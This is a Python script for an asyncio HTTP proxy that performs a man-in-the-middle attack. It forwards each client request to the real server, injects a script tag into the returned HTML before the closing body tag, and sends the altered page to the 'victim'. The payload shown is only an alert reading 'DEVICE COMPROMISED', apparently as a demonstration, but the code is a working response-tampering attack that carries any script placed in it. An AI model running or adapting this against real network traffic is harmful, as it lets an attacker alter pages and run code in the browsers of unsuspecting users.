import asyncio

# Javascript injection payload
INJECTION_SCRIPT = "<script>alert('DEVICE COMPROMISED')</script>"

async def handle_client(reader, writer):
    """
    This function handles new connections to the proxy server
    """

    # Read initial HTTP request from client
    request_data = await reader.read(4096)

    if not request_data:

        writer.close()
        await writer.wait_closed()
        return
    
    print (f"[PROXY] Intercepted target request.")

    # Find the destination server from the 'Host:' header
    host = ""
    for line in request_data.decode('latin-1').splitlines():
        if line.lower().startswith('host:'):
            host = line.split(' ')[1].strip()
            break

    if not host:
        writer.close()
        await writer.wait_closed()
        return
    
    # Open new connection to the real destination server
    try:
        remote_reader, remote_writer = await asyncio.open_connection(host, 80)

    except Exception as e:
        print(f"[ERROR] Could not connect to destination {host}: {e}")
        writer.close()
        await writer.wait_closed()
        return
    
    # Forward target's request to destination
    remote_writer.write(request_data)
    await remote_writer.drain()

    # Read the response from the destination server
    response_data = await remote_reader.read(4096)

    # Modification step
    # Convert response to string, inject script before </body> tag, and convert back to bytes
    response_str = response_data.decode('latin-1')
    modified_repsonse_str = response_str.replace('</body>', INJECTION_SCRIPT + '</body>')
    modified_repsonse_bytes = modified_repsonse_str.encode('latin-1')

    print('[PROXY] Injected script into response.')

    # Forward response back to victim
    writer.write(modified_repsonse_bytes)
    await writer.drain()

    # Clean up the connections
    writer.close()
    await writer.wait_closed()
    remote_writer.close()
    await remote_writer.wait_closed()

async def start_proxy_server():
    server = await asyncio.start_server(
        handle_client, '127.0.0.1', 8080)

    addr = server.sockets[0].getsockname()
    print(f'[PROXY] HTTP Modifier Proxy serving on {addr}')

    async with server:
        await server.serve_forever()

if __name__ == '__main__':
    try:
        asyncio.run(start_proxy_server())
    except KeyboardInterrupt:
        print("\n[PROXY] Shutting down proxy server.")